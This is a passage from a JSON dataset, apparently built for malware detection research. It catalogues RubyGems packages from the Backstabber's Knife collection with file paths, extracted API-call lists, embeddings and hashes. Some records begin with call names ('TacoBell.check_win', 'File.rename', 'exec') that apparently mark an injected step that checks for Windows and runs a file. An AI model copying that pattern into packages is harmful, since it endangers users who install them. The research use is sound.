}).[]', 'AchClient::AchWorks.wrap_request', 'self.to_hash', 'external_ach_ids', 'CompanyInfo.build.to_hash.merge', 'CompanyInfo.build.to_hash', 'CompanyInfo.build', 'AchClient::AchWorks.s_s_s', 'AchClient::AchWorks.loc_i_d', 'total_number_records', 'total_debit_records', 'total_debit_amount', 'total_credit_records', 'total_credit_amount', '@ach_transactions.map', 'private', '@ach_transactions.map', '@ach_transactions.count', '@ach_transactions.select', '@ach_transactions.select', 'debit_records.count', 'debit_records', 'credit_records.count', 'credit_records', 'total_amount', 'debit_records', 'total_amount', 'credit_records', 'ach_transactions.reduce', 'sum.+', 'transaction.amount', 'request_and_process_response', 'most_recent_hash', 'request_and_process_response', 'in_range_hash', 'private_class_method', 'AchClient::AchWorks.wrap_request', '[\"_response\", \"_result\"].map', '(method.to_s + postfix)\\n.to_sym', 'method.to_s.+', 'method.to_s', 'response.[](:total_num_records).==', 'response.[]', 'Helpers::Utils.hashlist_merge', 'response.[](:ach_return_records).[](:ach_return_record).select { |record,|\\n  record.[](:front_end_trace).present?\\n}.map', 'response.[](:ach_return_records).[](:ach_return_record).select', 'response.[](:ach_return_records).[]', 'response.[]', 'record.[](:front_end_trace).present?', 'record.[]', 'record.[](:front_end_trace).[]', 'record.[]', 'AchClient::AchWorks::ResponseRecordProcessor.process_response_record', 'private_class_method', 'AchClient::AchWorks::CompanyInfo.build', 'private_class_method', 'company_info.to_hash', 'company_info', 'private_class_method', 'company_info.to_hash.merge', 'company_info.to_hash', 'company_info', 'AchClient::AchWorks::DateFormatter.format', 'AchClient::AchWorks::DateFormatter.format', '22.freeze', 'super.+', 'attr_reader', 'AchClient::AchWorks.wrap_request({ method: :send_ach_trans, message: AchClient::AchWorks::CompanyInfo.build.to_hash.merge({ InpACHTransRecord: self.to_hash }), path: [:send_ach_trans_response, :send_ach_trans_result] }).[](:front_end_trace).[]', 'AchClient::AchWorks.wrap_request({ method: :send_ach_trans, message: AchClient::AchWorks::CompanyInfo.build.to_hash.merge({ InpACHTransRecord: self.to_hash }), path: [:send_ach_trans_response, :send_ach_trans_result] }).[]', 'AchClient::AchWorks.wrap_request', 'AchClient::AchWorks::CompanyInfo.build.to_hash.merge', 'AchClient::AchWorks::CompanyInfo.build.to_hash', 'AchClient::AchWorks::CompanyInfo.build', 'self.to_hash', 'AchClient::AchWorks.s_s_s', 'AchClient::AchWorks.loc_i_d', 'front_end_trace', 'merchant_name.[]', 'merchant_name', 'MAX_MERCHANT_NAME_LENGTH.-', 'routing_number.to_s', 'routing_number', 'account_number.to_s', 'account_number', 'originator_name.try', 'originator_name', 'sec_code', 'AchClient::AchWorks::TransactionTypeTransformer.serialize_to_provider_value', 'transaction_type', 'customer_id', 'AchClient::AchWorks::AccountTypeTransformer.serialize_to_provider_value', 'self.account_type', 'amount', 'DateFormatter.format', 'effective_entry_date', 'DateFormatter.format', 'effective_entry_date', 'memo.try', 'memo', 'external_ach_id.length.>', 'external_ach_id.length', 'external_ach_id', 'raise', 'external_ach_id', 'require', 'require_relative', 'include', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'self.request', 'response.success?', 'path.reduce', 'response.body', 'r.[]', 'response.[](:status).==', 'response.[]', 'raise', 'response.try(:[], :errors).try(:[], :string).try', 'response.try(:[], :errors).try', 'response.try', 'response.[]', 'raise', 'attr_reader', 'build_from_config', 'connection_check_request', 'connection_check_request', 'connection_valid?', 'company_valid?', 'self.instance_variables.map { |var,|\\n  { var.to_s.split(\"@\").last.camelize.to_sym => self.instance_variable_get(var) }\\n}.reduce', 'self.instance_variables.map', 'self.instance_variables', 'var.to_s.split(\"@\").last.camelize.to_sym', 'var.to_s.split(\"@\").last.camelize', 'var.to_s.split(\"@\").last', 'var.to_s.split', 'var.to_s', 'self.instance_variable_get', 'private', 'AchClient::AchWorks.request({ method: method, message: self.to_hash }).body.[](\"#{method}_response\".to_sym).[](\"#{method}_result\".to_sym).include?', 'AchClient::AchWorks.request({ method: method, message: self.to_hash }).body.[](\"#{method}_response\".to_sym).[]', 'AchClient::AchWorks.request({ method: method, message: self.to_hash }).body.[]', 'AchClient::AchWorks.request({ method: method, message: self.to_hash }).body', 'AchClient::AchWorks.request', 'self.to_hash', '\"#{method}_response\".to_sym', '\"#{method}_result\".to_sym', 'self.send', '(\"decipher_\" + gibberish.[](0..2))\\n.to_sym', '\"decipher_\".+', 'gibberish.[]', 'method.to_s.start_with?', 'method.to_s', 'args.[]', 'gibberish.is_a?', 'self.decipher_unknown', 'gibberish.[]', 'gibberish.[]', 'gibberish.[]', 'AchClient::AchWorks::AccountTypeTransformer.deserialize_provider_value', 'gibberish.[]', 'gibberish.[]', 'gibberish.[]', 'AchClient::AchWorks::AccountTypeTransformer.deserialize_provider_value', 'gibberish.[]', 'gibberish.[]', '\"AchWorks failed to document this correction code, so we \" + \"can\\'t tell you what this data means. You might be able to find \" + \"out by contacting them. Alternatively, you could check the \" + \"AchWorks web console, and match your records against theirs to \" + \"see what changed. Enjoy! Let us know what you find, and maybe we\".+', '\"AchWorks failed to document this correction code, so we \" + \"can\\'t tell you what this data means. You might be able to find \" + \"out by contacting them. Alternatively, you could check the \" + \"AchWorks web console, and match your records against theirs to \".+', '\"AchWorks failed to document this correction code, so we \" + \"can\\'t tell you what this data means. You might be able to find \" + \"out by contacting them. Alternatively, you could check the \".+', '\"AchWorks failed to document this correction code, so we \" + \"can\\'t tell you what this data means. You might be able to find \".+', '\"AchWorks failed to document this correction code, so we \".+', 'date.is_a?', 'format_string', 'date.respond_to?', 'format_date', 'raise', 'private_class_method', 'format_date', 'DateTime.parse', 'private_class_method', 'date.strftime', 'self.send', '(\"process_\" + record.[](:response_code))\\n.to_sym', '\"process_\".+', 'record.[]', 'method.to_s.start_with?', 'method.to_s', 'args.[]', 'record.is_a?', 'raise', 'record.[]', 'AchClient::ProcessingAchResponse.new', 'BigDecimal.new', 'record.[]', 'record.[]', 'AchClient::SettledAchResponse.new', 'BigDecimal.new', 'record.[]', 'record.[]', 'AchClient::ReturnedAchResponse.new', 'BigDecimal.new', 'record.[]', 'record.[]', 'AchClient::ReturnCodes.find_by', 'record.[](:action_detail).[]', 'record.[]', 'self.process_3RET', 'AchClient::CorrectedAchResponse.new', 'BigDecimal.new', 'record.[]', 'record.[]', 'AchClient::ReturnCodes.find_by', 'record.[](:action_detail).[]', 'record.[]', 'AchClient::AchWorks::CorrectionDetailsProcessor.decipher_correction_details', 'record.[]', 'raise', 'raise', 'KNOWN_ERROR_STRINGS.each', 'record.include?', 'raise', 'Helpers::Utils.hashlist_merge', 'AchClient::ICheckGateway.wrap_request({ method: :pull_transaction_report, message: AchClient::ICheckGateway::CompanyInfo.build.to_hash.merge({ startDate: start_date, endDate: end_date }) }).split(\"\\\\n\").select { |record,|\\n  check_for_errors(record)\\n  record.start_with?(\"ICHECK\")\\n}.map', 'AchClient::ICheckGateway.wrap_request({ method: :pull_transaction_report, message: AchClient::ICheckGateway::CompanyInfo.build.to_hash.merge({ startDate: start_date, endDate: end_date }) }).split(\"\\\\n\").select', 'AchClient::ICheckGateway.wrap_request({ method: :pull_transaction_report, message: AchClient::ICheckGateway::CompanyInfo.build.to_hash.merge({ startDate: start_date, endDate: end_date }) }).split', 'AchClient::ICheckGateway.wrap_request', 'AchClient::ICheckGateway::CompanyInfo.build.to_hash.merge', 'AchClient::ICheckGateway::CompanyInfo.build.to_hash', 'AchClient::ICheckGateway::CompanyInfo.build', 'check_for_errors', 'record.start_with?', 'record.split(\"|\").[]', 'record.split', 'AchClient::ICheckGateway::ResponseRecordProcessor.process_response_record', 'AchClient::ICheckGateway.wrap_request({ method: :process_check, message: self.to_hash }).split', 'AchClient::ICheckGateway.wrap_request', 'self.to_hash', 'response.[](0).==', 'response.[]', 'response.[]', 'raise', 'response.join', 'AchClient::ICheckGateway::CompanyInfo.build.to_hash.merge', 'AchClient::ICheckGateway::CompanyInfo.build.to_hash', 'AchClient::ICheckGateway::CompanyInfo.build', 'amount', 'routing_number.to_s', 'routing_number', 'account_number.to_s', 'account_number', 'AchClient::ICheckGateway::AccountTypeTransformer.serialize_to_provider_value', 'account_type', 'sec_code', 'AchClient::ICheckGateway::TransactionTypeTransformer.serialize_to_provider_value', 'transaction_type', 'merchant_name', 'memo', 'effective_entry_date', 'attr_reader', 'build_from_config', 'include', 'class_attribute', 'class_attribute', 'class_attribute', 'class_attribute', 'AchClient::ICheckGateway.request', 'response.success?', 'response.body.[](\"#{method}_response\".to_sym).[]', 'response.body.[]', 'response.body', '\"#{method}_response\".to_sym', '\"#{method}_result\".to_sym', 'raise', 'record.split', 'record.[](STATUS_COLUMN).first', 'record.[]', 'AchClient::ProcessingAchResponse.new', 'record.[]', 'record.[]', 'AchClient::SettledAchResponse.new', 'record.[]', 'record.[]', 'record.[](1).start_with?', 'record.[]', 'AchClient::ReturnedAchResponse.new', 'record.[]', 'record.[]', 'AchClient::ReturnCodes.find_by', 'record.[](STATUS_COLUMN).[]', 'record.[]', 'raise', 'record.join', 'extend', 'included', 'class_attribute', 'class_attribute', 'class_attribute', 'logged_response', 'soap_client.call', 'soap_client', 'private_class_method', 'self.to_s.demodulize', 'self.to_s', 'AchClient::Logging::LogProviderJob.perform_async', 'response.xml', 'DateTime.now', 'private_class_method', 'self._soap_client', 'Savon.client', 'self.wsdl', 'self.client_timeout_seconds', 'self.client_timeout_seconds', 'convert_request_keys_to', 'pretty_print_xml']",
            "n_tokens": 5930,
            "embedding": "[ 0.01155331 -0.00839405 -0.00134014 ... -0.00849081 -0.03038307\n  0.01036314]",
            "cluster": "0",
            "id": 519,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ach-client/1.0.3/ach-client-1.0.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ach-client/1.0.3/ach-client-1.0.3_extracted",
            "name": "ach-client",
            "version": "1.0.3",
            "published_at": "2020-02-16T01:55:06.494Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "codeclimate-test-reporter, minitest-reporters, minitest, mocha, pry, rake, simplecov, timecop, vcr, webmock, yard, bundler-audit, ach, activesupport, net-sftp, savon, sucker_punch",
            "SHA-256": "a482d205a76dadb520d94eaeb53d2c8b4bc3997cbd7e0b9ed7d9922a4e002688"
        },
        {
            "name_version": "acme_cli-0.6.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_cli/0.6.1/acme_cli-0.6.1_extracted/acme_cli-0.6.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', '@options.[](:color).!', '@options.[]', 'String.disable_colorization=', 'Logger.new(STDOUT).tap', 'Logger.new', 'logger.level=', 'Logger::SEV_LABEL.index', '@options.[](:log_level).upcase', '@options.[]', 'logger.formatter=', 'proc', 'datetime.to_s.light_black', 'datetime.to_s', '@logger.send', 'Acme::Client.new', 'account_key', 'endpoint', 'FileUtils.mkdir_p', '@options.[]', 'log', 'domain.blue', 'client.authorize', 'client', 'authorization.http01', 'File.join', '@options.[]', 'challenge.filename.split(\"/\").last', 'challenge.filename.split', 'challenge.filename', 'log', 'File.write', 'challenge.file_content', 'challenge.request_verification', '5.times', 'log', 'sleep', 'challenge.verify_status.!=', 'challenge.verify_status', 'challenge.verify_status.==', 'challenge.verify_status', 'log', 'domain.green', 'File.unlink', 'log', 'domain.red', 'log', 'challenge.error.[]', 'challenge.error', 'certificate_exists_and_valid_and_all_domains_included?', 'OpenSSL::X509::Request.new', 'find_or_create_pkey', '@options.[]', '@options.[]', 'csr.subject=', 'OpenSSL::X509::Name.new', 'domains.first', 'domains.count.>', 'domains.count', 'OpenSSL::X509::ExtensionFactory.new', 'ef.create_extension', 'domains.map { |domain,|\\n  \"DNS:#{domain}\"\\n}.join', 'domains.map', 'OpenSSL::ASN1.Set', 'OpenSSL::ASN1.Sequence', 'OpenSSL::X509::Attribute.new', 'OpenSSL::X509::Attribute.new', 'attrs.each', 'csr.add_attribute', 'csr.version=', 'csr.public_key=', 'certificate_private_key.public_key', 'csr.sign', 'OpenSSL::Digest::SHA256.new', 'client.new_certificate', 'client', 'File.write', '@options.[]', 'certificate.fullchain_to_pem', 'File.write', '@options.[]', 'certificate.chain_to_pem', 'File.write', '@options.[]', 'certificate.to_pem', 'log', '\"Certificate successfully created to #{@options.[](:fullchain_path)} #{@options.[](:chain_path)} and #{@options.[](:certificate_path)}!\".green', '@options.[]', '@options.[]', '@options.[]', 'log', 'certificate.x509.not_after', 'certificate.x509', 'File.exists?', 'log', 'OpenSSL::X509::Certificate.new', 'File.read', 'cert.not_after.to_date.-', 'cert.not_after.to_date', 'cert.not_after', '@options.[]', 'log', 'cert.not_after.to_date', 'cert.not_after', 'Date.today.>=', 'Date.today', 'log', 'File.exists?', 'log', 'OpenSSL::X509::Certificate.new', 'File.read', 'client.revoke_certificate', 'client', 'log', 'log', 'e.message', 'private', 'File.exists?(@options.[](:certificate_path)).!', 'File.exists?', '@options.[]', 'OpenSSL::X509::Certificate.new', 'File.read', '@options.[]', 'cert.extensions.map(&:to_h).select { |i,|\\n  i.[](\"oid\") == \"subjectAltName\"\\n}.map { |i,|\\n  i.[](\"value\")\\n}.join(\", \").split(/, */).map { |i,|\\n  i.sub(/^DNS:/, \"\")\\n}.+', 'cert.extensions.map(&:to_h).select { |i,|\\n  i.[](\"oid\") == \"subjectAltName\"\\n}.map { |i,|\\n  i.[](\"value\")\\n}.join(\", \").split(/, */).map', 'cert.extensions.map(&:to_h).select { |i,|\\n  i.[](\"oid\") == \"subjectAltName\"\\n}.map { |i,|\\n  i.[](\"value\")\\n}.join(\", \").split', 'cert.extensions.map(&:to_h).select { |i,|\\n  i.[](\"oid\") == \"subjectAltName\"\\n}.map { |i,|\\n  i.[](\"value\")\\n}.join', 'cert.extensions.map(&:to_h).select { |i,|\\n  i.[](\"oid\") == \"subjectAltName\"\\n}.map', 'cert.extensions.map(&:to_h).select', 'cert.extensions.map', 'cert.extensions', 'i.[](\"oid\").==', 'i.[]', 'i.[]', 'i.sub', '[cert.subject.to_s.sub(/\\\\/CN=/, \"\")].uniq.sort', '[cert.subject.to_s.sub(/\\\\/CN=/, \"\")].uniq', 'cert.subject.to_s.sub', 'cert.subject.to_s', 'cert.subject', 'domains.sort.uniq.-', 'domains.sort.uniq', 'domains.sort', 'missing_domains.!=', 'log', '@options.[]', 'missing_domains.join', 'domains_in_cert.join', 'cert.not_after.to_date', 'cert.not_after', 'expires_on.<=', 'Date.today', 'log', '@options.[]', 'expires_on.-', '@options.[]', 'renew_on.>', 'Date.today', 'log', '@options.[]', 'cert.not_after.to_date', 'cert.not_after', 'log', '@options.[]', 'exit', '@options.[]', 'find_or_create_pkey', '@options.[]', '@options.[]', 'File.exists?', 'log', 'OpenSSL::PKey::RSA.new', 'File.read', 'log', 'OpenSSL::PKey::RSA.new', 'File.write', 'private_key.to_s', 'File.chmod', 'require', 'require', 'require', 'class_option', 'class_option', 'class_option', 'class_option', 'desc', 'method_option', 'email.nil?', 'email.==', 'wrapper.log', 'wrapper', 'exit', 'email.[](/.*@.*/).!', 'email.[]', 'wrapper.log', 'wrapper', 'exit', 'wrapper.client.register', 'wrapper.client', 'wrapper', '\"mailto:\".+', 'registration.agree_terms', 'wrapper.log', 'wrapper', 'desc', 'method_option', 'method_option', 'Dir.[](File.join(@options.[](:webserver_dir), \"*\")).map { |file,|\\n  File.read(file).lines.grep(/^\\\\s*server_name/)\\n}.flatten', 'Dir.[](File.join(@options.[](:webserver_dir), \"*\")).map', 'Dir.[]', 'File.join', '@options.[]', 'File.read(file).lines.grep', 'File.read(file).lines', 'File.read', 'lines.flatten.map { |i,|\\n  i.strip.split(/[; ]/).drop(1)\\n}.flatten.reject { |i,|\\n  i.length < 3\\n}.uniq', 'lines.flatten.map { |i,|\\n  i.strip.split(/[; ]/).drop(1)\\n}.flatten.reject', 'lines.flatten.map { |i,|\\n  i.strip.split(/[; ]/).drop(1)\\n}.flatten', 'lines.flatten.map', 'lines.flatten', 'i.strip.split(/[; ]/).drop', 'i.strip.split', 'i.strip', 'i.length.<', 'i.length', 'authorize', 'desc', 'method_option', 'domains.each', 'wrapper.authorize(domain).!', 'wrapper.authorize', 'wrapper', 'rc.!=', 'exit', 'desc', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'domains.length.==', 'domains.length', 'wrapper.log', 'wrapper', 'exit', 'wrapper.cert', 'wrapper', 'desc', 'method_option', 'wrapper.check_certificate(path).!', 'wrapper.check_certificate', 'wrapper', 'exit', 'desc', 'wrapper.revoke_certificate(path).!', 'wrapper.revoke_certificate', 'wrapper', 'exit', 'desc', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'File.join', '@options.[]', '@options.[]', 'domains.first', 'FileUtils.mkdir_p', '@options.merge', 'File.join', 'File.join', 'File.join', 'File.join', 'wrapper.check_certificate', 'wrapper', '@options.[]', 'exit', 'authorize', 'cert', 'map', 'desc', 'puts', 'private', 'AcmeWrapper.new', 'options']",
            "n_tokens": 1906,
            "embedding": "[ 0.00988083 -0.01966646 -0.00507844 ... -0.00068002 -0.02126567\n  0.01467845]",
            "cluster": "0",
            "id": 509,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_cli/0.6.1/acme_cli-0.6.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_cli/0.6.1/acme_cli-0.6.1_extracted",
            "name": "acme_cli",
            "version": "0.6.1",
            "published_at": "2020-02-16T01:56:16.046Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "pry, activesupport, simplecov, vcr, webmock, timecop, bundler, rake, rspec, acme-client, thor, colorize",
            "SHA-256": "eb7aed0c5682a119a064dbaf46cdc3d851b8e05e774ae2d6d9d15957135a2834"
        },
        {
            "name_version": "acme_client-2.0.5",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_client/2.0.5/acme_client-2.0.5_extracted/acme_client-2.0.5_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', '\"http://127.0.0.1:4000/directory\".freeze', '\"Acme::Client v#{Acme::Client::VERSION} (#{repo_url})\".freeze', 'jwk.nil?', 'private_key.nil?', 'raise', 'Acme::Client::JWK.from_private_key', 'Acme::Client::Resources::Directory.new', 'URI', 'attr_reader', 'Array', 'payload.[]=', 'post', 'endpoint_for', 'response.headers.fetch', 'response.headers', 'response.body.nil?', 'response.body', 'response.body.empty?', 'response.body', 'account', 'attributes_from_account_response', 'Acme::Client::Resources::Account.new', 'payload.[]=', 'Array', 'payload.[]=', 'post', 'kid', 'attributes_from_account_response', 'Acme::Client::Resources::Account.new', 'kid', 'post', 'kid', 'attributes_from_account_response', 'Acme::Client::Resources::Account.new', 'kid', 'post', 'endpoint_for', 'response.headers.fetch', 'response.headers', 'post_as_get', 'attributes_from_account_response', 'Acme::Client::Resources::Account.new', 'account.kid', 'account', 'payload.[]=', 'prepare_order_identifiers', 'payload.[]=', 'payload.[]=', 'post', 'endpoint_for', 'attributes_from_order_response', 'Acme::Client::Resources::Order.new', 'post_as_get', 'attributes_from_order_response', 'Acme::Client::Resources::Order.new', 'arguments.merge', 'csr.respond_to?', 'raise', 'Acme::Client::Util.urlsafe_base64', 'csr.to_der', 'post', 'attributes_from_order_response', 'Acme::Client::Resources::Order.new', 'download', 'response.body', 'post_as_get', 'attributes_from_authorization_response', 'Acme::Client::Resources::Authorization.new', 'post', 'attributes_from_authorization_response', 'Acme::Client::Resources::Authorization.new', 'post_as_get', 'attributes_from_challenge_response', 'Acme::Client::Resources::Challenges.new', 'post', 'attributes_from_challenge_response', 'Acme::Client::Resources::Challenges.new', 'certificate.respond_to?', 'certificate.to_der', 'OpenSSL::X509::Certificate.new(certificate).to_der', 'OpenSSL::X509::Certificate.new', 'Acme::Client::Util.urlsafe_base64', 'reason.nil?', 'payload.[]=', 'post', 'endpoint_for', 'response.success?', 'new_connection', 'endpoint_for', 'connection.head', 'nonces.<<', 'nonces', 'response.headers.[]', 'response.headers', '@directory.meta', '@directory.terms_of_service', '@directory.website', '@directory.caa_identities', '@directory.external_account_required', 'private', 'identifiers.is_a?', 'Array(identifiers).map', 'Array', 'identifier.is_a?', 'extract_attributes', 'response.body', 'extract_attributes', 'response.body', 'response.headers.[]', 'response.headers', 'attributes.[]=', 'response.headers.[]', 'response.headers', 'extract_attributes', 'response.body', 'extract_attributes', 'response.body', 'attributes.map { |fields,|\\n  Array(fields)\\n}.each_with_object', 'attributes.map', 'Array', 'key.to_s', 'hash.[]=', 'input.[]', 'connection_for', 'connection.post', 'connection_for', 'connection.post', 'connection_for', 'connection.get', 'connection_for', 'connection.post', 'request.url', 'request.headers.[]=', 'request.headers', 'CONTENT_TYPES.fetch', 'URI', 'uri.scheme', 'uri.hostname', 'uri.port', '@connections.[]', '@connections.[](mode).[]', '@connections.[]', 'new_acme_connection', 'new_connection', 'configuration.use', 'Faraday.new', '@bad_nonce_retry.>', 'configuration.request', 'block_given?', 'configuration.adapter', 'Faraday.default_adapter', 'response.headers.[]', 'response.headers', 'limit.zero?', 'links.nil?', 'links.[](\"up\").nil?', 'links.[]', 'get', 'links.[]', 'OpenSSL::X509::Certificate.new', 'issuer.body', 'fetch_chain', 'limit.-', '@directory.endpoint_for', 'extend', '{ common_name: \"CN\", country_name: \"C\", organization_name: \"O\", organizational_unit: \"OU\", state_or_province: \"ST\", locality_name: \"L\" }.freeze', '{ \"CN\" => OpenSSL::ASN1::UTF8STRING, \"C\" => OpenSSL::ASN1::UTF8STRING, \"O\" => OpenSSL::ASN1::UTF8STRING, \"OU\" => OpenSSL::ASN1::UTF8STRING, \"ST\" => OpenSSL::ASN1::UTF8STRING, \"L\" => OpenSSL::ASN1::UTF8STRING }.freeze', 'attr_reader', 'def_delegators', 'generate_private_key', 'DEFAULT_DIGEST.new', 'normalize_subject', '@subject.[]', 'SUBJECT_KEYS.[]', '@subject.[]', 'names.to_a.dup', 'names.to_a', 'normalize_names', '@subject.[]', 'SUBJECT_KEYS.[]', 'validate_subject', 'generate', 'private', 'OpenSSL::PKey::RSA.new', 'subject.each_with_object', 'hash.[]=', 'SUBJECT_KEYS.fetch', 'value.to_s', '@names.include?', '@names.unshift', '@names.empty?', 'raise', '@names.first', 'validate_subject_attributes', 'validate_subject_common_name', '@subject.keys - SUBJECT_KEYS.keys.-', '@subject.keys.-', '@subject.keys', 'SUBJECT_KEYS.keys', 'SUBJECT_KEYS.values', 'extra_keys.empty?', 'raise', 'extra_keys.inspect', '@common_name.==', '@subject.[]', 'SUBJECT_KEYS.[]', 'raise', 'OpenSSL::X509::Request.new.tap', 'OpenSSL::X509::Request.new', '@private_key.is_a?', 'RbConfig::CONFIG.[](\"MAJOR\").==', 'RbConfig::CONFIG.[]', 'RbConfig::CONFIG.[](\"MINOR\").to_i.<', 'RbConfig::CONFIG.[](\"MINOR\").to_i', 'RbConfig::CONFIG.[]', 'ECKeyPatch.new', 'csr.public_key=', 'csr.subject=', 'generate_subject', 'csr.version=', 'add_extension', 'csr.sign', 'OpenSSL::X509::Name.new', '@subject.map', 'SUBJECT_TYPES.[]', 'OpenSSL::X509::ExtensionFactory.new.create_extension', 'OpenSSL::X509::ExtensionFactory.new', '@names.map { |name,|\\n  \"DNS:#{name}\"\\n}.join', '@names.map', 'csr.add_attribute', 'OpenSSL::X509::Attribute.new', 'OpenSSL::ASN1::Set.new', 'OpenSSL::ASN1::Sequence.new', 'require', 'attr_reader', '@env.[](:request_headers).[]=', '@env.[]', '@env.[](:request_headers).[]=', '@env.[]', '@env.method.!=', '@env.method', '@env.body=', 'client.jwk.jws', 'client.jwk', 'client', 'jws_header', 'env.body', '@app.call(env).on_complete', '@app.call', 'on_complete', 'raise', 'raise_on_not_found!', 'store_nonce', 'env.body=', 'decode_body', 'env.response_headers.[]=', 'env.response_headers', 'decode_link_headers', 'env.success?', 'raise_on_error!', 'private', 'pop_nonce', 'env.url.to_s', 'env.url', 'env', '@mode.==', 'headers.[]=', 'client.kid', 'client', 'env.status.==', 'env.status', 'env', 'raise', 'env.url.to_s', 'env.url', 'env', 'raise', 'error_class', 'error_message', 'env.body.is_a?', 'env.body', 'env', 'env.body.[]', 'env.body', 'env', 'env.body', 'env', 'Acme::Client::Error::ACME_ERRORS.fetch', 'error_name', 'env.body.is_a?', 'env.body', 'env', 'env.body.key?', 'env.body', 'env', 'env.body.[]', 'env.body', 'env', 'env.response_headers.[](\"Content-Type\").to_s', 'env.response_headers.[]', 'env.response_headers', 'env', 'content_type.start_with?', 'JSON.load', 'env.body', 'env', 'env.body', 'env', 'env.response_headers.key?', 'env.response_headers', 'env', 'env.response_headers.[]', 'env.response_headers', 'env', 'link_header.split(\", \").map', 'link_header.split', 'entry.match', 'Hash.[]', 'links.flatten', 'env.response_headers.[]', 'env.response_headers', 'env', 'nonces.<<', 'nonces', 'nonces.empty?', 'nonces', 'get_nonce', 'nonces.pop', 'nonces', 'client.get_nonce', 'client', 'client.nonces', 'client', 'Acme::Client::JWK::RSA.new', 'Acme::Client::JWK::ECDSA.new', 'raise', 'require', 'require', 'require', 'raise', 'jws_header', 'Acme::Client::Util.urlsafe_base64', 'header.to_json', 'Acme::Client::Util.urlsafe_base64', 'payload.nil?', 'payload.to_json', 'sign', 'Acme::Client::Util.urlsafe_base64', '{ protected: encoded_header, payload: encoded_payload, signature: encoded_signature }.to_json', 'to_h.to_json', 'to_h', 'raise', 'Acme::Client::Util.urlsafe_base64', 'THUMBPRINT_DIGEST.digest', 'to_json', '{ typ: \"JWT\", alg: jwa_alg }.merge', 'jwa_alg', 'header.[](:kid).nil?', 'header.[]', 'jws.[]=', 'to_h', 'raise', 'raise', '{ \"prime256v1\" => { jwa_crv: \"P-256\", jwa_alg: \"ES256\", digest: OpenSSL::Digest::SHA256 }.freeze, \"secp384r1\" => { jwa_crv: \"P-384\", jwa_alg: \"ES384\", digest: OpenSSL::Digest::SHA384 }.freeze, \"secp521r1\" => { jwa_crv: \"P-521\", jwa_alg: \"ES512\", digest: OpenSSL::Digest::SHA512 }.freeze }.freeze', '{ jwa_crv: \"P-256\", jwa_alg: \"ES256\", digest: OpenSSL::Digest::SHA256 }.freeze', '{ jwa_crv: \"P-384\", jwa_alg: \"ES384\", digest: OpenSSL::Digest::SHA384 }.freeze', '{ jwa_crv: \"P-521\", jwa_alg: \"ES512\", digest: OpenSSL::Digest::SHA512 }.freeze', 'private_key.is_a?', 'raise', 'KNOWN_CURVES.[]', 'private_key.group.curve_name', 'private_key.group', 'raise', '@curve_params.[]', '@curve_params.[]', 'Acme::Client::Util.urlsafe_base64', 'coordinates.[](:x).to_s', 'coordinates.[]', 'coordinates', 'Acme::Client::Util.urlsafe_base64', 'coordinates.[](:y).to_s', 'coordinates.[]', 'coordinates', '@private_key.sign', '@curve_params.[](:digest).new', '@curve_params.[]', 'OpenSSL::ASN1.decode', 'seq.value', 'ints.map', 'bns.map', '[bn.to_s(16)].pack', 'bn.to_s', '[r, s].join', 'private', 'public_key.to_bn.to_s', 'public_key.to_bn', 'public_key', 'hex.length.-', 'hex.length', 'hex.[]', 'data_len./', 'hex.[]', '2.+', 'data_len./', 'data_len./', 'OpenSSL::BN.new', '[hex_x].pack', 'OpenSSL::BN.new', '[hex_y].pack', '@private_key.public_key', 'private_key.is_a?', 'raise', 'Acme::Client::Util.urlsafe_base64', 'public_key.e.to_s', 'public_key.e', 'public_key', 'Acme::Client::Util.urlsafe_base64', 'public_key.n.to_s', 'public_key.n', 'public_key', '@private_key.sign', 'DIGEST.new', 'private', '@private_key.public_key', 'require', 'require', 'require', 'require', 'require', 'attr_reader', 'assign_attributes', 'url', 'assign_attributes', '@client.account_update({ contact: contact, terms_of_service_agreed: term_of_service }).to_h', '@client.account_update', 'term_of_service', 'assign_attributes', '@client.account_deactivate.to_h', '@client.account_deactivate', 'assign_attributes', '@client.account.to_h', '@client.account', 'url', 'term_of_service', 'status', 'contact', 'private', 'Array', 'attr_reader', 'assign_attributes', 'assign_attributes', '@client.deactivate_authorization({ url: url }).to_h', '@client.deactivate_authorization', 'url', 'assign_attributes', '@client.authorization({ url: url }).to_h', '@client.authorization', 'url', '@challenges.map', 'initialize_challenge', 'challenges.find', 'challenges', 'challenge.is_a?', 'alias_method', 'challenges.find', 'challenges', 'challenge.is_a?', 'alias_method', 'url', 'identifier', 'status', 'expires', 'wildcard', 'private', 'attributes.fetch', 'attributes.fetch', 'attributes.fetch', 'attributes.fetch', 'attributes.[]', 'Acme::Client::Resources::Challenges.new', 'identifier.fetch', 'require', 'require', 'require', 'require', 'CHALLENGE_TYPES.fetch(type, Unsupported).new', 'CHALLENGE_TYPES.fetch', 'attr_reader', 'assign_attributes', 'self.class', 'token', '@client.jwk.thumbprint', '@client.jwk', 'assign_attributes', '@client.challenge({ url: url }).to_h', '@client.challenge', 'url', 'assign_attributes', 'send_challenge_validation', 'url', 'status', 'url', 'token', 'error', 'private', '@client.request_challenge_validation({ url: url }).to_h', 